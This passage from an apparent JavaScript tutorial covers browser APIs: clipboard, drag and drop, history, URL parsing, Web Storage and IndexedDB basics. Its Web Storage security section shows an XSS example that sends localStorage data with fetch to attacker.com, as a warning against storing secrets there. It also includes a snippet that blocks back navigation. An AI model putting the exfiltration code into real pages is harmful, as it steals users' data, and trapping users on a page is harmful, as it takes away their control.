The Clipboard API has widespread modern browser support, but checking for availability is recommended:

```javascript
if (navigator.clipboard && navigator.clipboard.writeText) {
  await navigator.clipboard.writeText(text);
} else {
  // Fallback to document.execCommand or textarea method
  const textarea = document.createElement('textarea');
  textarea.value = text;
  document.body.appendChild(textarea);
  textarea.select();
  document.execCommand('copy');
  document.body.removeChild(textarea);
}
```

Image clipboard operations have more limited support than text operations. The `read()` and `write()` methods for rich content require specific browser versions.

### Handling Multiple Items

The `write()` and `read()` methods accept/return arrays, but most implementations currently support only single items in the array.

```javascript
// Writing multiple items
await navigator.clipboard.write([item1, item2]); // [Unverified] Limited browser support

// Reading returns array even for single item
const items = await navigator.clipboard.read();
const firstItem = items[0];
```

### Common Patterns

**Copy button implementation**:

```javascript
async function copyToClipboard(text) {
  try {
    await navigator.clipboard.writeText(text);
    showFeedback('Copied!');
  } catch (err) {
    showFeedback('Failed to copy');
  }
}

button.addEventListener('click', () => copyToClipboard('content'));
```

**Paste from clipboard into editor**:

```javascript
pasteButton.addEventListener('click', async () => {
  try {
    const items = await navigator.clipboard.read();
    for (const item of items) {
      if (item.types.includes('text/html')) {
        const blob = await item.getType('text/html');
        const html = await blob.text();
        editor.insertHTML(html);
      } else if (item.types.includes('text/plain')) {
        const blob = await item.getType('text/plain');
        const text = await blob.text();
        editor.insertText(text);
      }
    }
  } catch (err) {
    console.error('Paste failed:', err);
  }
});
```

**Image paste handling**:

```javascript
document.addEventListener('paste', async (e) => {
  const items = e.clipboardData.items;
  
  for (const item of items) {
    if (item.type.startsWith('image/')) {
      const file = item.getAsFile();
      const url = URL.createObjectURL(file);
      
      const img = document.createElement('img');
      img.src = url;
      document.body.appendChild(img);
    }
  }
});
```

---

## Drag and Drop API

### API Architecture

The HTML5 Drag and Drop API provides a standardized mechanism for implementing drag-and-drop interactions in web applications. It operates through a series of events fired on both draggable elements and drop targets during the drag operation lifecycle.

### Core Events Sequence

**On the draggable element:**

1. `dragstart` - Fires when the user begins dragging
2. `drag` - Fires continuously while dragging (typically every few hundred milliseconds)
3. `dragend` - Fires when the drag operation completes (whether successful or cancelled)

**On potential drop targets:**

1. `dragenter` - Fires when a dragged element enters a valid drop target
2. `dragover` - Fires continuously while the dragged element is over the drop target
3. `dragleave` - Fires when the dragged element leaves the drop target
4. `drop` - Fires when the element is dropped on a valid target

### Making Elements Draggable

**HTML attribute:**

```html
<div draggable="true">Drag me</div>
```

**Default draggable elements:**

- Images (`<img>`)
- Links (`<a>` with `href`)
- Selected text

All other elements require explicit `draggable="true"` to enable dragging.

### DataTransfer Object

The `DataTransfer` object is the central mechanism for data exchange during drag operations. It's accessible through the `dataTransfer` property on drag event objects.

**Key properties:**

**`dropEffect`** - Indicates the type of drag-and-drop operation:

- `"none"` - No operation permitted
- `"copy"` - Copy to new location
- `"move"` - Move to new location
- `"link"` - Establish a link to the source

**`effectAllowed`** - Set during `dragstart` to specify allowed operations:

- `"none"`, `"copy"`, `"move"`, `"link"`
- `"copyMove"`, `"copyLink"`, `"linkMove"`
- `"all"` (default)
- `"uninitialized"`

**`files`** - FileList object containing files being dragged (from file system)

**`types`** - Read-only array of data format types stored in the DataTransfer object

**`items`** - DataTransferItemList providing access to dragged data items

### Data Storage and Retrieval

**`setData(format, data)`** - Store data during `dragstart`:

```javascript
element.addEventListener('dragstart', (e) => {
  e.dataTransfer.setData('text/plain', 'Hello');
  e.dataTransfer.setData('text/html', '<strong>Hello</strong>');
  e.dataTransfer.setData('application/json', JSON.stringify({id: 123}));
});
```

**`getData(format)`** - Retrieve data during `drop`:

```javascript
target.addEventListener('drop', (e) => {
  const text = e.dataTransfer.getData('text/plain');
  const html = e.dataTransfer.getData('text/html');
  const json = JSON.parse(e.dataTransfer.getData('application/json'));
});
```

**MIME type formats:** Standard formats include `text/plain`, `text/html`, `text/uri-list`, and custom formats like `application/x-custom-type`.

**Data availability restrictions:** `getData()` only works in the `drop` event for security reasons. Other events can only access `types` and `items.length`.

### DataTransferItemList Interface

Provides more granular control over drag data:

```javascript
e.dataTransfer.items.add('text', 'text/plain');
e.dataTransfer.items.add(file); // Add File object

// During drop
for (let item of e.dataTransfer.items) {
  if (item.kind === 'string') {
    item.getAsString((str) => console.log(str));
  } else if (item.kind === 'file') {
    const file = item.getAsFile();
  }
}
```

**`kind` property:**

- `"string"` - Text data
- `"file"` - File object

### Enabling Drop Targets

By default, elements are not valid drop targets. To enable dropping:

```javascript
target.addEventListener('dragover', (e) => {
  e.preventDefault(); // Required to allow dropping
  e.dataTransfer.dropEffect = 'copy';
});

target.addEventListener('drop', (e) => {
  e.preventDefault(); // Prevent default action (like navigation)
  // Handle drop
});
```

**Critical requirement:** Both `dragover` and `drop` events must call `preventDefault()` or the drop will be rejected.

### Visual Feedback Mechanisms

**Drag image customization:**

```javascript
element.addEventListener('dragstart', (e) => {
  const img = new Image();
  img.src = 'drag-icon.png';
  e.dataTransfer.setDragImage(img, 25, 25); // image, xOffset, yOffset
});
```

The offsets specify the cursor position relative to the drag image's top-left corner.

**CSS pseudo-classes:**

- `:drag` - Applied to element being dragged (limited browser support)
- Drop target styling must be managed manually via JavaScript class toggling

**Typical feedback pattern:**

```javascript
target.addEventListener('dragenter', (e) => {
  e.currentTarget.classList.add('drag-over');
});

target.addEventListener('dragleave', (e) => {
  e.currentTarget.classList.remove('drag-over');
});

target.addEventListener('drop', (e) => {
  e.currentTarget.classList.remove('drag-over');
});
```

### File Drag and Drop

**Accepting files from file system:**

```javascript
dropzone.addEventListener('drop', (e) => {
  e.preventDefault();
  
  const files = e.dataTransfer.files;
  for (let file of files) {
    console.log(file.name, file.size, file.type);
    
    // Read file content
    const reader = new FileReader();
    reader.onload = (event) => {
      console.log(event.target.result);
    };
    reader.readAsText(file);
  }
});
```

**File type filtering:** Check `file.type` against accepted MIME types, as the API doesn't provide built-in filtering for file drops.

**Directory handling:** DataTransferItem API provides `webkitGetAsEntry()` (non-standard) for accessing directory structures, but support is limited and the feature remains experimental.

### Security Considerations

**Cross-origin restrictions:** Data transfer between different origins is restricted. DataTransfer data from cross-origin sources may be limited or inaccessible.

**Data sanitization:** Always validate and sanitize dragged data before using it, especially when accepting HTML content or executing operations based on dragged identifiers.

**File access:** File objects obtained through drag-and-drop have the same security constraints as file input elements—they represent user-intentional file selection.

### Event Propagation and Cancellation

**Bubbling behavior:** All drag events bubble up the DOM tree, allowing delegation patterns.

**Stopping propagation:** Use `stopPropagation()` to prevent parent elements from receiving drag events, useful for nested drop zones.

**Default actions:** Browsers have default drag behaviors (like dragging images opens them in a new tab). Call `preventDefault()` in `dragstart` to suppress these when implementing custom drag behavior.

### dragenter/dragleave Challenges

**Event firing on child elements:** `dragenter` and `dragleave` fire when crossing into/out of child elements, causing flickering in visual feedback:

```javascript
// Problem: fires on every child element boundary
target.addEventListener('dragenter', (e) => {
  target.classList.add('highlight'); // Flickers
});

target.addEventListener('dragleave', (e) => {
  target.classList.remove('highlight'); // Flickers
});

// Solution: counter pattern
let dragCounter = 0;

target.addEventListener('dragenter', (e) => {
  dragCounter++;
  target.classList.add('highlight');
});

target.addEventListener('dragleave', (e) => {
  dragCounter--;
  if (dragCounter === 0) {
    target.classList.remove('highlight');
  }
});
```

Alternative: Check `e.relatedTarget` or use pointer-events CSS to prevent child interference.

### Touch Device Considerations

**Native touch support:** The Drag and Drop API has inconsistent support on touch devices. Many mobile browsers don't fire drag events for touch interactions.

**Polyfill requirements:** Touch-based drag-and-drop typically requires additional libraries or manual implementation using touch events (`touchstart`, `touchmove`, `touchend`).

**Hybrid approach:** Implement both pointer events and drag-and-drop API for maximum compatibility:

```javascript
// Use Pointer Events for unified mouse/touch handling
element.addEventListener('pointerdown', handleDragStart);
element.addEventListener('pointermove', handleDragMove);
element.addEventListener('pointerup', handleDragEnd);
```

### Performance Considerations

**`drag` event frequency:** The `drag` event fires frequently (every ~350ms or more often). Expensive operations in this handler can cause jank. Throttle or debounce handlers if performing calculations.

**Ghost element rendering:** The browser creates a translucent drag image. Custom drag images with `setDragImage()` may have rendering performance implications if the source element is complex.

**Memory leaks:** Ensure data stored in DataTransfer doesn't create unintended references to large objects, as the DataTransfer object persists throughout the drag operation.

### Multi-Item Dragging

**Dragging multiple elements:** The API doesn't natively support multi-selection drag. Implementations require:

1. Managing selection state separately
2. Storing identifiers for all selected items in DataTransfer
3. Reconstructing the selection on drop

```javascript
dragstart: (e) => {
  const selectedIds = getSelectedItemIds();
  e.dataTransfer.setData('application/json', JSON.stringify(selectedIds));
}
```

### Integration Patterns

**Framework compatibility:** React, Vue, and Angular require careful event handling due to synthetic event systems:

```javascript
// React example
<div
  draggable
  onDragStart={(e) => {
    // e is a SyntheticEvent wrapping native event
    e.dataTransfer.setData('text/plain', data);
  }}
  onDrop={(e) => {
    e.preventDefault();
    const data = e.dataTransfer.getData('text/plain');
  }}
/>
```

**State management:** Track drag state (isDragging, draggedItem, dropTarget) in application state for complex interactions requiring coordination across components.

### Accessibility Concerns

**Keyboard navigation:** The native Drag and Drop API provides no keyboard support. Accessible implementations require:

- Alternative keyboard-based selection and movement mechanisms
- ARIA live regions announcing drag state changes
- Focus management during drag operations

**Screen reader support:** Screen readers have limited awareness of drag operations. Provide textual alternatives or supplementary controls.

**ARIA attributes:** Use `aria-grabbed` (deprecated but still used) or custom ARIA properties to indicate draggable state. Announce drop zones with `role="region"` and appropriate labels.

### Browser Compatibility Notes

**Safari peculiarities:** Safari requires data to be set in `dragstart` for the drag to function, even if the data isn't used. Setting empty string data is sufficient:

```javascript
e.dataTransfer.setData('text/plain', '');
```

**DataTransferItemList support:** IE11 doesn't support the `items` property. Feature detection and fallbacks are necessary for broad compatibility.

**`setDragImage` behavior:** The drag image positioning and rendering varies across browsers. Test thoroughly if using custom drag images.

### Comparison with Alternative Approaches

**Pointer Events API:** Provides more control and consistency, especially for touch devices, but requires manual implementation of drag logic.

**Mouse/Touch Events:** Lower-level approach requiring complete manual implementation but offers maximum control and cross-device compatibility.

**Third-party libraries:** Libraries like Sortable.js, interact.js, and react-beautiful-dnd abstract complexity and handle cross-browser/device inconsistencies.

The native Drag and Drop API is best suited for simple desktop drag operations, file uploads, and scenarios where framework compatibility is assured. Complex interactions or mobile requirements often benefit from alternative approaches.

---

## History Object

The `history` object is a built-in browser API that provides access to the browser's session history — the list of pages visited in the current tab or frame.

### Accessing the History Object

```javascript
window.history
// or simply
history
```

### Key Properties

#### `history.length`
Returns the number of entries in the session history stack.

```javascript
console.log(history.length); // e.g., 5
```

#### `history.state`
Returns the current state object associated with the history entry (set via `pushState()` or `replaceState()`).

```javascript
console.log(history.state); // null or an object
```

#### `history.scrollRestoration`
Controls whether the browser should restore scroll position when navigating. Values: `'auto'` (default) or `'manual'`.

```javascript
history.scrollRestoration = 'manual';
```

### Key Methods

#### `history.back()`
Navigates to the previous page in history (equivalent to clicking the browser's back button).

```javascript
history.back();
```

#### `history.forward()`
Navigates to the next page in history (equivalent to clicking the browser's forward button).

```javascript
history.forward();
```

#### `history.go()`
Navigates to a specific page in history relative to the current page.

```javascript
history.go(-1);  // same as history.back()
history.go(1);   // same as history.forward()
history.go(-2);  // go back 2 pages
history.go(0);   // reload current page
```

#### `history.pushState()`
Adds a new entry to the session history stack without reloading the page.

```javascript
history.pushState(state, unused, url);
```

**Parameters:**
- `state`: An object associated with the new history entry (max ~2MB depending on browser)
- `unused`: Historically for a title, now ignored by most browsers (pass empty string)
- `url` (optional): The URL for the new history entry (must be same origin)

**Example:**
```javascript
const stateObj = { page: 1, data: 'example' };
history.pushState(stateObj, '', '/page1');
```

#### `history.replaceState()`
Modifies the current history entry instead of creating a new one.

```javascript
history.replaceState(state, unused, url);
```

**Example:**
```javascript
const stateObj = { page: 1, updated: true };
history.replaceState(stateObj, '', '/page1-updated');
```

### The `popstate` Event

Fires when the user navigates through history (back/forward buttons) or when `history.back()`, `history.forward()`, or `history.go()` is called.

```javascript
window.addEventListener('popstate', (event) => {
  console.log('Location:', document.location);
  console.log('State:', event.state);
});
```

**Important:** `popstate` does NOT fire when calling `pushState()` or `replaceState()`.

### Common Use Cases

#### Single Page Application (SPA) Navigation

```javascript
// Navigate to a new "page"
function navigateTo(page) {
  const state = { page: page };
  history.pushState(state, '', `/${page}`);
  renderPage(page);
}

// Handle browser back/forward
window.addEventListener('popstate', (event) => {
  if (event.state && event.state.page) {
    renderPage(event.state.page);
  }
});
```

#### Preserving Scroll Position

```javascript
// Save scroll position before navigation
const scrollPos = window.scrollY;
history.replaceState({ scrollPos }, '', window.location.href);

// Restore on popstate
window.addEventListener('popstate', (event) => {
  if (event.state && event.state.scrollPos) {
    window.scrollTo(0, event.state.scrollPos);
  }
});
```

#### Preventing Back Navigation

```javascript
// Add a dummy state
history.pushState(null, '', window.location.href);

// Prevent going back
window.addEventListener('popstate', () => {
  history.pushState(null, '', window.location.href);
});
```

### Browser Support

The `history` object is supported in all modern browsers. `pushState()` and `replaceState()` are supported in IE10+.

### Security Restrictions

- The new URL must be on the same origin (protocol, domain, and port)
- The state object is serialized, so it cannot contain functions or DOM nodes
- There's a size limit on the state object (typically around 640KB to 2MB depending on the browser)

### Differences from `window.location`

- `history` methods don't cause page reloads (unlike setting `window.location`)
- `history` maintains the session history stack
- `history` allows storing state data with each entry

---

## URL and URLSearchParams

### What is a URL?

A **URL** (Uniform Resource Locator) is a reference to a web resource that specifies its location on a computer network and a mechanism for retrieving it. URLs are used to access web pages, images, videos, and other resources on the internet.

A typical URL structure looks like this:

```
https://www.example.com:8080/path/to/page?key1=value1&key2=value2#section
```

This breaks down into:
- **Protocol** (`https://`): The scheme used to access the resource
- **Domain** (`www.example.com`): The host server location
- **Port** (`:8080`): Optional port number
- **Path** (`/path/to/page`): The specific resource location
- **Query string** (`?key1=value1&key2=value2`): Parameters passed to the resource
- **Fragment** (`#section`): A specific section within the resource

### The URL API

JavaScript provides the `URL` API for parsing and manipulating URLs. This API is available in both browsers and Node.js environments.

#### Creating a URL Object

```javascript
// Absolute URL
const url = new URL('https://example.com/path?name=value');

// Relative URL (requires base URL)
const url2 = new URL('/path', 'https://example.com');
```

#### URL Properties

The `URL` object provides properties to access and modify different parts of the URL:

```javascript
const url = new URL('https://user:pass@example.com:8080/path/page?key=value#section');

console.log(url.href);       // Full URL
console.log(url.protocol);   // "https:"
console.log(url.username);   // "user"
console.log(url.password);   // "pass"
console.log(url.host);       // "example.com:8080"
console.log(url.hostname);   // "example.com"
console.log(url.port);       // "8080"
console.log(url.pathname);   // "/path/page"
console.log(url.search);     // "?key=value"
console.log(url.hash);       // "#section"
console.log(url.origin);     // "https://example.com:8080"
```

These properties are also writable, allowing you to modify the URL:

```javascript
url.pathname = '/new/path';
url.search = '?updated=true';
```

### URLSearchParams

The `URLSearchParams` API provides utilities for working with URL query strings. It makes it easy to read, modify, and construct query parameters.

#### Creating URLSearchParams

```javascript
// From a URL object
const url = new URL('https://example.com?name=John&age=30');
const params = url.searchParams;

// From a query string
const params2 = new URLSearchParams('name=John&age=30');

// From an object
const params3 = new URLSearchParams({ name: 'John', age: '30' });

// From an array of arrays
const params4 = new URLSearchParams([['name', 'John'], ['age', '30']]);
```

#### Reading Parameters

```javascript
const params = new URLSearchParams('name=John&age=30&hobby=reading&hobby=coding');

// Get a single value
params.get('name');        // "John"
params.get('missing');     // null

// Get all values for a key (useful for arrays)
params.getAll('hobby');    // ["reading", "coding"]

// Check if a key exists
params.has('name');        // true
params.has('missing');     // false

// Iterate over all parameters
params.forEach((value, key) => {
  console.log(`${key}: ${value}`);
});

// Get as an iterator
for (const [key, value] of params) {
  console.log(`${key}: ${value}`);
}
```

#### Modifying Parameters

```javascript
const params = new URLSearchParams('name=John&age=30');

// Set a parameter (replaces existing)
params.set('name', 'Jane');

// Append a parameter (doesn't replace)
params.append('hobby', 'reading');
params.append('hobby', 'coding');

// Delete a parameter
params.delete('age');

// Sort parameters alphabetically
params.sort();

// Convert to string
params.toString();  // "hobby=reading&hobby=coding&name=Jane"
```

#### Using with URL Objects

```javascript
const url = new URL('https://example.com/search');

// Modify query parameters
url.searchParams.set('q', 'javascript');
url.searchParams.set('page', '1');

console.log(url.href);  
// "https://example.com/search?q=javascript&page=1"

// Update the URL's search property
url.search = url.searchParams.toString();
```

### Practical Examples

#### Building a Search URL

```javascript
function buildSearchURL(baseUrl, filters) {
  const url = new URL(baseUrl);
  
  Object.entries(filters).forEach(([key, value]) => {
    if (Array.isArray(value)) {
      value.forEach(v => url.searchParams.append(key, v));
    } else if (value !== null && value !== undefined) {
      url.searchParams.set(key, value);
    }
  });
  
  return url.toString();
}

const searchUrl = buildSearchURL('https://api.example.com/products', {
  category: 'electronics',
  tags: ['sale', 'featured'],
  minPrice: 100
});
// "https://api.example.com/products?category=electronics&tags=sale&tags=featured&minPrice=100"
```

#### Parsing Query Parameters from Current Page

```javascript
// In a browser
const currentParams = new URLSearchParams(window.location.search);
const userId = currentParams.get('userId');
const filters = currentParams.getAll('filter');
```

#### URL Encoding and Decoding

The `URLSearchParams` API automatically handles encoding and decoding of special characters:

```javascript
const params = new URLSearchParams();
params.set('message', 'Hello World! Special chars: & = ?');

console.log(params.toString());
// "message=Hello+World%21+Special+chars%3A+%26+%3D+%3F"

console.log(params.get('message'));
// "Hello World! Special chars: & = ?"
```

### Browser and Environment Support

Both `URL` and `URLSearchParams` are widely supported in modern browsers and Node.js (version 10+). They are part of the WHATWG URL Standard and provide a standardized way to work with URLs across different JavaScript environments.

---

# HTML5 APIs

## LocalStorage and SessionStorage

### Web Storage API Overview

LocalStorage and SessionStorage are part of the Web Storage API, providing key-value storage mechanisms in the browser. Both store data as strings with a simple synchronous API, offering 5-10MB of storage per origin (exact limits vary by browser). These storage mechanisms operate entirely client-side and do not automatically transmit data to servers.

### Fundamental Differences

#### LocalStorage Persistence

LocalStorage data persists indefinitely until explicitly deleted by user action (clearing browser data) or programmatic removal. Data survives browser restarts, system reboots, and remains accessible across all tabs and windows from the same origin.

```javascript
// Data persists indefinitely
localStorage.setItem('userPreference', 'darkMode');

// Still accessible after browser restart
const preference = localStorage.getItem('userPreference');
```

#### SessionStorage Lifetime

SessionStorage data exists only for the duration of the page session. A session lasts as long as the browser tab or window is open and survives page reloads and restores. Each tab/window maintains its own separate sessionStorage instance, even for the same origin.

```javascript
// Data bound to current tab/window session
sessionStorage.setItem('temporaryToken', 'abc123');

// Cleared when tab closes
// Separate from other tabs viewing the same page
```

Opening a page in a new tab creates a new session with separate sessionStorage, while duplicate tabs (using "Duplicate Tab" functionality) may copy sessionStorage contents depending on browser implementation.

### Storage API Methods

Both localStorage and sessionStorage share identical APIs:

```javascript
// Store data
localStorage.setItem('key', 'value');

// Retrieve data
const value = localStorage.getItem('key');

// Remove specific item
localStorage.removeItem('key');

// Clear all data for origin
localStorage.clear();

// Get number of items
const count = localStorage.length;

// Access by index
const keyName = localStorage.key(0);

// Bracket notation (alternative syntax)
localStorage['key'] = 'value';
const value = localStorage['key'];
```

### String-Only Storage and Type Coercion

Web Storage only stores strings. Non-string values are coerced to strings via `toString()`:

```javascript
// Numbers converted to strings
localStorage.setItem('count', 42);
console.log(typeof localStorage.getItem('count')); // "string"
console.log(localStorage.getItem('count')); // "42"

// Objects converted to "[object Object]"
localStorage.setItem('user', {name: 'Alice'}); // Loses data
console.log(localStorage.getItem('user')); // "[object Object]"

// Arrays converted to comma-separated string
localStorage.setItem('items', [1, 2, 3]);
console.log(localStorage.getItem('items')); // "1,2,3"
```

This behavior requires explicit serialization for complex data types.

### JSON Serialization Pattern

JSON serialization preserves data structures:

```javascript
// Storing objects
const user = {
  name: 'Alice',
  age: 30,
  preferences: { theme: 'dark' }
};
localStorage.setItem('user', JSON.stringify(user));

// Retrieving objects
const retrievedUser = JSON.parse(localStorage.getItem('user'));
console.log(retrievedUser.name); // "Alice"

// Handling missing keys
const data = localStorage.getItem('nonexistent');
const parsed = data ? JSON.parse(data) : null;
```

`JSON.stringify()` cannot serialize functions, undefined values, symbols, or circular references. Attempting to parse invalid JSON throws a `SyntaxError`.

### Error Handling

Storage operations can fail due to quota exceeded, security restrictions, or browser configuration:

```javascript
try {
  localStorage.setItem('key', 'value');
} catch (e) {
  if (e.name === 'QuotaExceededError') {
    console.error('Storage quota exceeded');
  } else if (e.name === 'SecurityError') {
    console.error('Storage access denied');
  }
}

// Safe retrieval with parsing
function safeGetItem(key) {
  try {
    const item = localStorage.getItem(key);
    return item ? JSON.parse(item) : null;
  } catch (e) {
    console.error('Failed to retrieve or parse item:', e);
    return null;
  }
}
```

Private browsing modes may throw exceptions on write attempts or provide isolated storage that's cleared when the private session ends.

### Storage Event for Cross-Tab Communication

The `storage` event fires on other tabs/windows from the same origin when localStorage is modified. The event does **not** fire in the tab that made the change:

```javascript
// In Tab A
localStorage.setItem('message', 'Hello from Tab A');

// In Tab B (different tab, same origin)
window.addEventListener('storage', (e) => {
  console.log('Key changed:', e.key);
  console.log('Old value:', e.oldValue);
  console.log('New value:', e.newValue);
  console.log('URL:', e.url);
  console.log('Storage area:', e.storageArea);
});
```

StorageEvent properties:

- `key`: The key that changed (null if `clear()` was called)
- `oldValue`: Previous value (null if newly added)
- `newValue`: New value (null if removed)
- `url`: URL of the document that made the change
- `storageArea`: Reference to the affected storage object

SessionStorage modifications do **not** trigger storage events because each tab has isolated sessionStorage.

### Origin-Based Isolation

Storage is isolated by origin (protocol + domain + port). Different origins cannot access each other's storage:

```javascript
// https://example.com:443
localStorage.setItem('data', 'value');

// https://example.com:8080 - Different port, different storage
// http://example.com - Different protocol, different storage
// https://sub.example.com - Different subdomain, different storage
```

This isolation provides security boundaries but limits sharing data across subdomains or related sites.

### Storage Quota Management

Browsers allocate approximately 5-10MB per origin, with exact limits varying:

```javascript
// Estimate available storage (if supported)
if (navigator.storage && navigator.storage.estimate) {
  navigator.storage.estimate().then(estimate => {
    console.log('Usage:', estimate.usage);
    console.log('Quota:', estimate.quota);
    console.log('Percentage:', (estimate.usage / estimate.quota * 100).toFixed(2) + '%');
  });
}
```

[Unverified] Exact quota limits differ by browser and may be affected by available disk space, browser profile settings, and device type.

Strategies for quota management:

```javascript
// Check current usage
function getStorageSize() {
  let total = 0;
  for (let key in localStorage) {
    if (localStorage.hasOwnProperty(key)) {
      total += key.length + localStorage[key].length;
    }
  }
  return total * 2; // Approximate bytes (UTF-16)
}

// Clean old data
function cleanOldEntries(maxAge) {
  const now = Date.now();
  for (let key in localStorage) {
    if (localStorage.hasOwnProperty(key)) {
      try {
        const data = JSON.parse(localStorage[key]);
        if (data.timestamp && now - data.timestamp > maxAge) {
          localStorage.removeItem(key);
        }
      } catch (e) {
        // Skip non-JSON entries
      }
    }
  }
}
```

### Expiration Pattern Implementation

Neither localStorage nor sessionStorage has built-in expiration. Manual implementation is required:

```javascript
// Store with expiration
function setWithExpiry(key, value, ttl) {
  const item = {
    value: value,
    expiry: Date.now() + ttl
  };
  localStorage.setItem(key, JSON.stringify(item));
}

// Retrieve with expiration check
function getWithExpiry(key) {
  const itemStr = localStorage.getItem(key);
  if (!itemStr) return null;
  
  try {
    const item = JSON.parse(itemStr);
    if (Date.now() > item.expiry) {
      localStorage.removeItem(key);
      return null;
    }
    return item.value;
  } catch (e) {
    return null;
  }
}

// Usage
setWithExpiry('token', 'abc123', 3600000); // 1 hour TTL
const token = getWithExpiry('token');
```

### Synchronous Blocking Behavior

Both storage APIs are synchronous, blocking JavaScript execution during read/write operations:

```javascript
// Blocks main thread
for (let i = 0; i < 10000; i++) {
  localStorage.setItem(`key${i}`, 'value');
}
// UI frozen during this loop
```

For large-scale operations, batch updates or defer non-critical storage operations:

```javascript
// Batch storage updates
function batchStore(data) {
  requestIdleCallback(() => {
    Object.entries(data).forEach(([key, value]) => {
      localStorage.setItem(key, JSON.stringify(value));
    });
  });
}
```

[Inference] The synchronous nature makes Web Storage unsuitable for storing large amounts of data or performing frequent write operations in performance-critical code paths.

### Security Considerations

#### XSS Vulnerability

LocalStorage is accessible to any JavaScript executing on the page, making it vulnerable to XSS attacks:

```javascript
// Malicious script injected via XSS
const stolenData = localStorage.getItem('sensitiveData');
fetch('https://attacker.com/collect', {
  method: 'POST',
  body: stolenData
});
```

**Never store sensitive data** (passwords, authentication tokens, personal information) in localStorage or sessionStorage without encryption. HttpOnly cookies are more secure for authentication tokens as they're inaccessible to JavaScript.

#### No Built-in Encryption

Data is stored in plaintext. Browser DevTools can inspect all stored values:

```javascript
// Visible in DevTools -> Application -> Local Storage
localStorage.setItem('creditCard', '4111-1111-1111-1111'); // Bad practice
```

If sensitive data must be stored client-side, implement client-side encryption, though this has limitations as the encryption key must also be managed client-side.

#### HTTPS Requirement for Security

While localStorage works over HTTP, sensitive data should only be stored when served over HTTPS to prevent man-in-the-middle attacks from intercepting stored data during transmission.

### Common Use Cases

#### LocalStorage Appropriate Uses

- User preferences (theme, language, layout)
- Cached application state
- Draft content (form data, unsubmitted posts)
- Client-side application configuration
- Offline-first application data (with appropriate sync mechanisms)

```javascript
// User preferences
function saveTheme(theme) {
  localStorage.setItem('theme', theme);
  document.body.className = theme;
}

function loadTheme() {
  const theme = localStorage.getItem('theme') || 'light';
  document.body.className = theme;
}
```

#### SessionStorage Appropriate Uses

- Single-page form data during multi-step processes
- Temporary authentication state for the current tab
- Tab-specific UI state
- Wizard or checkout flow data
- Temporary filters or search parameters

```javascript
// Multi-step form persistence
function saveFormStep(stepData, stepNumber) {
  sessionStorage.setItem(`formStep${stepNumber}`, JSON.stringify(stepData));
}

function loadFormData() {
  const steps = {};
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    if (key.startsWith('formStep')) {
      steps[key] = JSON.parse(sessionStorage.getItem(key));
    }
  }
  return steps;
}
```

### Alternative Storage APIs

#### IndexedDB

For larger datasets, structured data, or asynchronous operations:

```javascript
// IndexedDB provides:
// - Asynchronous API (non-blocking)
// - Much larger storage limits (hundreds of MB to GB)
// - Indexed queries and transactions
// - Storage of complex objects without serialization
```

#### Cache API

For caching network resources:

```javascript
// Cache API provides:
// - Storage of HTTP responses
// - Integration with Service Workers
// - Offline-first strategies
```

#### Cookies

For server communication:

```javascript
// Cookies provide:
// - Automatic transmission with HTTP requests
// - HttpOnly flag for XSS protection
// - Secure flag for HTTPS-only transmission
// - Domain and path scoping
// - Smaller storage limit (4KB per cookie)
```

### Browser Compatibility

LocalStorage and SessionStorage are supported in all modern browsers (Chrome, Firefox, Safari, Edge) and IE 8+. Feature detection is recommended:

```javascript
function isStorageAvailable(type) {
  try {
    const storage = window[type];
    const test = '__storage_test__';
    storage.setItem(test, test);
    storage.removeItem(test);
    return true;
  } catch (e) {
    return false;
  }
}

if (isStorageAvailable('localStorage')) {
  // Use localStorage
} else {
  // Fallback mechanism
}
```

Private browsing, browser extensions, or security policies may disable storage even in supporting browsers.

### Performance Characteristics

#### Read Performance

Read operations are generally fast (microseconds) but synchronous:

```javascript
// Fast for small reads
const value = localStorage.getItem('key'); // ~0.001-0.01ms

// Slower for iterations
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key); // Each call has overhead
}
```

#### Write Performance

Write operations involve disk I/O and are slower than reads:

```javascript
// Write performance degrades with storage size
localStorage.setItem('key', largeString); // ~0.1-1ms or more
```

[Inference] Browsers may implement write buffering or caching strategies, but the exact implementation is browser-specific and not standardized.

### Iteration Patterns

Several approaches exist for iterating over storage:

```javascript
// Method 1: Using length and key()
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  console.log(key, value);
}

// Method 2: for...in (includes inherited properties)
for (let key in localStorage) {
  if (localStorage.hasOwnProperty(key)) {
    console.log(key, localStorage[key]);
  }
}

// Method 3: Object.keys
Object.keys(localStorage).forEach(key => {
  console.log(key, localStorage.getItem(key));
});
```

Method 1 is most reliable as it uses the standardized API and doesn't require hasOwnProperty checks.

### Testing and Mocking

In testing environments, localStorage may need to be mocked:

```javascript
// Simple mock for Node.js environments
class LocalStorageMock {
  constructor() {
    this.store = {};
  }
  
  clear() {
    this.store = {};
  }
  
  getItem(key) {
    return this.store[key] || null;
  }
  
  setItem(key, value) {
    this.store[key] = String(value);
  }
  
  removeItem(key) {
    delete this.store[key];
  }
  
  get length() {
    return Object.keys(this.store).length;
  }
  
  key(index) {
    const keys = Object.keys(this.store);
    return keys[index] || null;
  }
}

global.localStorage = new LocalStorageMock();
```

Modern testing frameworks often provide built-in localStorage mocks or require explicit configuration to access browser APIs.

---

## IndexedDB Basics

### Architecture and Data Model

IndexedDB implements a transactional NoSQL database system within the browser. Data organizes into databases containing object stores, which hold JavaScript objects indexed by keys.

```javascript
// Database contains multiple object stores
// Each object store contains records (key-value pairs)
// Records can have indexes for alternative lookup paths

Database
├── Object Store: "users"
│   ├── Index: "email"
│   ├── Index: "age"
│   └── Records: { id: 1, name: "Alice", email: "alice@example.com" }
├── Object Store: "posts"
└── Object Store: "comments"
```

### Opening and Creating Databases

```javascript
const request = indexedDB.open('MyDatabase', 1);

request.onerror = (event) => {
  console.error('Database error:', event.target.error);
};

request.onsuccess = (event) => {
  const db = event.target.result;
  // Database ready for operations
};

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  
  // Create object stores only during upgrade
  if (!db.objectStoreNames.contains('users')) {
    const objectStore = db.createObjectStore('users', { keyPath: 'id', autoIncrement: true });
    
    // Create indexes
    objectStore.createIndex('email', 'email', { unique: true });
    objectStore.createIndex('age', 'age', { unique: false });
  }
};
```

### Object Store Creation Strategies

#### Key Path Specification

```javascript
// Use existing property as key
const store = db.createObjectStore('users', { keyPath: 'id' });

// Nested key path
const store = db.createObjectStore('users', { keyPath: 'metadata.userId' });

// Auto-incrementing key
